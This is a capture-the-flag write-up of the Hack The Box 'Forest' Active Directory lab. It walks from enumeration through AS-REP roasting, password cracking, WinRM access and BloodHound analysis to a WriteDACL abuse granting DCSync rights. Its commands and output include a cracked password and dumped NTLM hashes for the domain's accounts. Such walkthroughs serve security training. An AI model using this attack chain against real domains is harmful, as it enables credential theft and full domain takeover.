---
title: "Forest"
seoTitle: "Exploring Forest Ecosystems"
seoDescription: "Explore Active Directory hacking: SMB enumeration, Kerberos attacks, privilege escalation with Bloodhound for domain takeover"
datePublished: Sun Feb 09 2025 18:19:00 GMT+0000 (Coordinated Universal Time)
cuid: cm6xy7eve000609kz47hef2c9
slug: forest
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1739091678096/4ab0058c-5f6e-4ba0-86f7-5adedab92ef6.png
tags: windows, hacking, hacker, active-directory, cybersecurity-1, dacl

---

IP: **10.129.136.21**

Let’s start with the nmap scan.

```bash
nmap -sC -sV -o nmap 10.129.136.21
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-09 04:02 EST
Nmap scan report for 10.129.136.21
Host is up (0.23s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-02-09 09:09:53Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-02-09T01:10:11-08:00
|_clock-skew: mean: 2h46m50s, deviation: 4h37m11s, median: 6m48s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2025-02-09T09:10:08
|_  start_date: 2025-02-09T08:43:32

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.15 seconds
```

From the output, we can see that it has `port 88 kerberos` open, `port 135 RPC` open, `port 139/445 SMB` open, `port 389 ldap` open and `port 5985 win-rm` open. Which suggests that it’s an Active Directory box. We can also find the domain name `htb.local` and hostname `FOREST.htb.local`.

Now, as we have SMB open let’s start by enumerating this.

```bash
smbclient -L \\\\10.129.136.21\\
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739092338608/0d8feb92-46d5-4c3c-9001-22e6935af1b0.png align="center")

We do have anonymous login enabled but no shares are listed. Let’s use `enum4linux` it to find some usernames and do some more enumeration in the machine.

```bash
enum4linux 10.129.136.21
```

```bash
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Feb  9 04:16:41 2025

 =========================================( Target Information )=========================================

Target ........... 10.129.136.21
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.129.136.21 )===========================


[E] Can't find workgroup/domain



 ===============================( Nbtstat Information for 10.129.136.21 )===============================

Looking up status of 10.129.136.21
No reply from 10.129.136.21

 ===================================( Session Check on 10.129.136.21 )===================================


[+] Server 10.129.136.21 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.129.136.21 )================================
                                                                                                                                                             
Domain Name: HTB                                                                                                                                             
Domain Sid: S-1-5-21-3072663084-364016917-1341370565

[+] Host is part of a domain (not a workgroup)                                                                                                               
                                                                                                                                                             
                                                                                                                                                             
 ==================================( OS information on 10.129.136.21 )==================================
                                                                                                                                                             
                                                                                                                                                             
[E] Can't get OS info with smbclient                                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
[+] Got OS info for 10.129.136.21 from srvinfo:                                                                                                              
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED                                                                                       


 =======================================( Users on 10.129.136.21 )=======================================
                                                                                                                                                             
index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA  Name: (null)    Desc: (null)                                                         
index: 0xfbc RID: 0x1f4 acb: 0x00000010 Account: Administrator  Name: Administrator     Desc: Built-in account for administering the computer/domain
index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy  Name: Andy Hislip       Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1  Name: HealthMailbox-EXCH01-010  Desc: (null)
index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e  Name: HealthMailbox-EXCH01-003  Desc: (null)
index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678  Name: HealthMailbox-EXCH01-005  Desc: (null)
index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e  Name: HealthMailbox-EXCH01-009  Desc: (null)
index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781  Name: HealthMailbox-EXCH01-006  Desc: (null)
index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d  Name: HealthMailbox-EXCH01-004  Desc: (null)
index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64  Name: HealthMailbox-EXCH01-008  Desc: (null)
index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9  Name: HealthMailbox-EXCH01-002  Desc: (null)
index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722  Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013  Desc: (null)
index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad  Name: HealthMailbox-EXCH01-001  Desc: (null)
index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238  Name: HealthMailbox-EXCH01-007  Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda       Name: Lucinda Berger    Desc: (null)
index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark  Name: Mark Brandt       Desc: (null)
index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi Name: Santi Rodriguez   Desc: (null)
index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien     Name: Sebastien Caron   Desc: (null)
index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb  Name: Microsoft Exchange Migration      Desc: (null)
index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb  Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}       Desc: (null)
index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb  Name: Microsoft Exchange Approval Assistant     Desc: (null)
index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18  Name: Discovery Search Mailbox  Desc: (null)
index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a  Name: Microsoft Exchange        Desc: (null)
index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb  Name: E4E Encryption Store - Active     Desc: (null)
index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549  Name: Microsoft Exchange Federation Mailbox     Desc: (null)
index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b  Name: Microsoft Exchange        Desc: (null)
index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b  Name: Microsoft Exchange        Desc: (null)
index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco  Name: svc-alfresco      Desc: (null)

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]

 =================================( Share Enumeration on 10.129.136.21 )=================================
                                                                                                                                                             
do_connect: Connection to 10.129.136.21 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                     

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.129.136.21                                                                                                                
                                                                                                                                                             
                                                                                                                                                             
 ===========================( Password Policy Information for 10.129.136.21 )===========================
                                                                                                                                                             
                                                                                                                                                             

[+] Attaching to 10.129.136.21 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.129.136.21)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] HTB
        [+] Builtin

[+] Password Info for Domain: HTB

        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: 1 day 4 minutes 
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
Password Complexity: Disabled                                                                                                                                
Minimum Password Length: 7


 ======================================( Groups on 10.129.136.21 )======================================
                                                                                                                                                             
                                                                                                                                                             
[+] Getting builtin groups:                                                                                                                                  
                                                                                                                                                             
group:[Account Operators] rid:[0x224]                                                                                                                        
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[System Managed Accounts Group] rid:[0x245]
group:[Storage Replica Administrators] rid:[0x246]
group:[Server Operators] rid:[0x225]

[+]  Getting builtin group memberships:                                                                                                                      
                                                                                                                                                             
Group: Users' (RID: 545) has member: Couldn't lookup SIDs                                                                                                    
Group: Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Group: Account Operators' (RID: 548) has member: Couldn't lookup SIDs
Group: IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Group: Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Group: System Managed Accounts Group' (RID: 581) has member: Couldn't lookup SIDs
Group: Guests' (RID: 546) has member: Couldn't lookup SIDs
Group: Administrators' (RID: 544) has member: Couldn't lookup SIDs
Group: Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs

[+]  Getting local groups:                                                                                                                                   
                                                                                                                                                             
group:[Cert Publishers] rid:[0x205]                                                                                                                          
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+]  Getting local group memberships:                                                                                                                        
                                                                                                                                                             
Group: Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs                                                                   

[+]  Getting domain groups:                                                                                                                                  
                                                                                                                                                             
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]                                                                                                  
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]

[+]  Getting domain group memberships:                                                                                                                       
                                                                                                                                                             
Group: 'Domain Users' (RID: 513) has member: HTB\Administrator                                                                                               
Group: 'Domain Users' (RID: 513) has member: HTB\DefaultAccount
Group: 'Domain Users' (RID: 513) has member: HTB\krbtgt
Group: 'Domain Users' (RID: 513) has member: HTB\$331000-VK4ADACQNUCA
Group: 'Domain Users' (RID: 513) has member: HTB\SM_2c8eef0a09b545acb
Group: 'Domain Users' (RID: 513) has member: HTB\SM_ca8c2ed5bdab4dc9b
Group: 'Domain Users' (RID: 513) has member: HTB\SM_75a538d3025e4db9a
Group: 'Domain Users' (RID: 513) has member: HTB\SM_681f53d4942840e18
Group: 'Domain Users' (RID: 513) has member: HTB\SM_1b41c9286325456bb
Group: 'Domain Users' (RID: 513) has member: HTB\SM_9b69f1b9d2cc45549
Group: 'Domain Users' (RID: 513) has member: HTB\SM_7c96b981967141ebb
Group: 'Domain Users' (RID: 513) has member: HTB\SM_c75ee099d0a64c91b
Group: 'Domain Users' (RID: 513) has member: HTB\SM_1ffab36a2f5f479cb
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailboxc3d7722
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailboxfc9daad
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailboxc0a90c9
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailbox670628e
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailbox968e74d
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailbox6ded678
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailbox83d6781
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailboxfd87238
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailboxb01ac64
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailbox7108a4e
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailbox0659cc1
Group: 'Domain Users' (RID: 513) has member: HTB\sebastien
Group: 'Domain Users' (RID: 513) has member: HTB\lucinda
Group: 'Domain Users' (RID: 513) has member: HTB\svc-alfresco
Group: 'Domain Users' (RID: 513) has member: HTB\andy
Group: 'Domain Users' (RID: 513) has member: HTB\mark
Group: 'Domain Users' (RID: 513) has member: HTB\santi
Group: 'Schema Admins' (RID: 518) has member: HTB\Administrator
Group: 'Managed Availability Servers' (RID: 1120) has member: HTB\EXCH01$
Group: 'Managed Availability Servers' (RID: 1120) has member: HTB\Exchange Servers
Group: 'Organization Management' (RID: 1104) has member: HTB\Administrator
Group: 'Service Accounts' (RID: 1148) has member: HTB\svc-alfresco
Group: 'Domain Computers' (RID: 515) has member: HTB\EXCH01$
Group: 'Exchange Windows Permissions' (RID: 1121) has member: HTB\Exchange Trusted Subsystem
Group: 'Group Policy Creator Owners' (RID: 520) has member: HTB\Administrator
Group: 'Privileged IT Accounts' (RID: 1149) has member: HTB\Service Accounts
Group: 'Domain Controllers' (RID: 516) has member: HTB\FOREST$
Group: 'Enterprise Admins' (RID: 519) has member: HTB\Administrator
Group: 'Exchange Trusted Subsystem' (RID: 1119) has member: HTB\EXCH01$
Group: 'Exchange Servers' (RID: 1118) has member: HTB\EXCH01$
Group: 'Exchange Servers' (RID: 1118) has member: HTB\$D31000-NSEL5BRJ63V7
Group: 'Domain Guests' (RID: 514) has member: HTB\Guest
Group: 'Domain Admins' (RID: 512) has member: HTB\Administrator
Group: '$D31000-NSEL5BRJ63V7' (RID: 1133) has member: HTB\EXCH01$

 ==================( Users on 10.129.136.21 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                             
                                                                                                                                                             
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.                                                                                    
                                                                                                                                                             
                                                                                                                                                             
 ===============================( Getting printer info for 10.129.136.21 )===============================
                                                                                                                                                             
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                                                                      


enum4linux complete on Sun Feb  9 04:24:45 2025
```

So, here we were able to find some users. Let’s create a list of usernames.

```bash
gedit users.txt
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739093329319/0836e584-79cf-4f7b-b5b3-59c0203ae8fa.png align="center")

Now, we have the usernames and found that Kerberos was open on the machine but we haven’t got any passwords yet. So, let’s perform `AS-Reproasing` an attack to see if any user accounts have Kerberos pre-authentication disabled which will help us steal the password hash.

```bash
impacket-GetNPUsers htb.local/ -usersfile users.txt -request -outputfile hashes.asreproast -dc-ip 10.129.136.21
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739093903988/ef7259bc-56a7-4d1f-b3b8-70342c45cfc3.png align="center")

And we got the hash for the `svc-alfresco` which is the service account. Let’s crack this hash using John.

```bash
john --wordlist=/usr/share/eaphammer/wordlists/rockyou.txt hashes.asreproast
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739094108182/90484b8a-0525-43ae-b0a1-486a5fa744ad.png align="center")

We got the password `s3rvice`. Now, from the scan, we know that it has `port 5985` open which is for Windows Remote Management (WinRM). So, let’s use these creds and get access to the system.

```bash
evil-winrm -i 10.129.136.21 -u svc-alfresco -p 's3rvice'
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739094340316/2672a35f-d919-412e-8cd4-470bfc588d2f.png align="center")

We’re in! Let’s grab our first flag.

```bash
type users.txt
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739094406565/ecdf5ff7-420c-4cfd-a304-8fc21ad3fb28.png align="center")

Flag: ***09d47f6a78e10a1e8b605ad4b0a0419d***

Let’s escalate our privileges for root now.

Now, that we have a valid user account let’s try to search for a path to the DC for that we will use a Bloodhound ingestor to collect the info about our target domain.

```bash
bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d htb.local -dc FOREST.htb.local -c all -ns 10.129.136.21
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739096189593/e35e47ee-154f-43aa-8437-361a8be1a02a.png align="center")

Now let's compress our JSON file into a zip and then let's use Bloodhound to see the data.

```bash
mv *.json /home/kali/HTB/boxes/Forest/bloodhound
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739096279360/f7de3600-bfaa-4121-b5d0-c17d45591267.png align="center")

```bash
zip -r bloodhound.zip bloodhound
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739096551085/347fbb4c-a028-4f4e-893a-dc30070a60ca.png align="center")

```bash
sudo neo4j start
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739096589342/c49e1958-d555-4957-8651-7dc9a13c46bf.png align="center")

```bash
bloodhound
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739096617800/3135f221-9c45-4c43-a291-7fe51842ec7f.png align="center")

Let’s import our zip file now.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739098616234/b782cb6e-eb13-483b-b8d2-9eb585e559ce.png align="center")

Let’s first mark the user as owned and set it as a starting node.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739098654164/6edd30ea-4882-4448-9413-dd5a9a55ee80.png align="center")

Next, let’s map the user to the domain controller. after playing around sometime we concluded with something interesting. If we check the shortest path from owned principles.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739111062248/ef28249c-cbfa-405b-b2a7-1122fba271bd.png align="center")

We can see that the svc-alfresco user is a member of the service accounts group which is a member of the Privileged IT Accounts group which is a member of the account operators group which has generic all on the `EXCH01.HTB.LOCAL` server. But if we check the path to domain admin from accounts operators.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739111234716/03dcfb61-95ac-4d99-b8d3-7b619564f855.png align="center")

We can see that the Account operators group has Generic All on the Exchange Windows Permissions group which has `WriteDACL` on `htb.local`. While doing some Google info we came across this article from Microsoft Docs.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739111360026/8212ba8f-5a42-42da-ab9b-4299bc2a136e.png align="center")

It states that we can create a user but cannot add in the Administrators or the related groups mentioned below which does not include the Exchange Windows Permissions group. So, let’s create a user and add it to this group.

```powershell
net user Dignitas Hacker123 /add /domain
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739111612773/31b460cc-3fec-455a-894f-049136a95ea1.png align="center")

Let’s now check for all the users in the Exchange Windows Permissions group.

```powershell
net group "Exchange Windows Permissions"
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739111685199/e4197fb7-361b-41db-b395-ccbea21b9617.png align="center")

There are no users in this group so let’s add our user (Dignitas).

```powershell
net group "Exchange Windows Permissions" /add Dignitas
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739111772722/b762b2d1-cf9c-4b46-af71-a396f882efe8.png align="center")

We’ve successfully added our user to the `Windows Exchange Permissions` group. Let’s now check the info for the `WriteDACL` bloodhound.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739112097633/02797f35-681b-4cde-b66b-d229b6e73501.png align="center")

Woah! With this `WriteDacl` access, we can grant our user `Dignitas` any privilege we want on the object. Let’s take a look at the `Linux Abuse` section.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739112497629/eaaadc5e-0f68-4ed7-b22d-9bafb3711f43.png align="center")

So, here we have a complete guide on how to abuse this. Let’s get going with this then.

First, we need to abuse `WriteDacl` to grant `DCSync` privileges. If we have **WriteDACL** on a domain object (like `HTB.LOCAL`), we can modify the `Access Control List (ACL)` to grant `DS-Replication-Get-Changes` **&** `DS-Replication-Get-Changes-All`. This allows us to perform a **DCSync attack**, effectively dumping all domain credentials.

Let’s first transfer `Powerview.ps1` on our win-rm shell.

```powershell
upload pv.ps1
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739124331602/0738d164-34bb-4eb6-b686-78b8c78f028f.png align="center")

Let’s enable the execution policy to run our script.

```powershell
powershell -ep bypass
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739124380070/ad610d37-c4b2-458a-8cd3-569c28ec8e22.png align="center")

```powershell
$pass = convertto-securestring 'Hacker123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\Dignitas', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity Dignitas -Rights DCSync
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739124602111/6865608e-6eab-4cdc-a083-0c96c16d89c9.png align="center")

Once we have DCSync rights, we can dump the NTLM hashes of **all** users, including **Domain Admins**

```bash
impacket-secretsdump htb.local/Dignitas:Hacker123@10.129.136.21
```

```bash
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
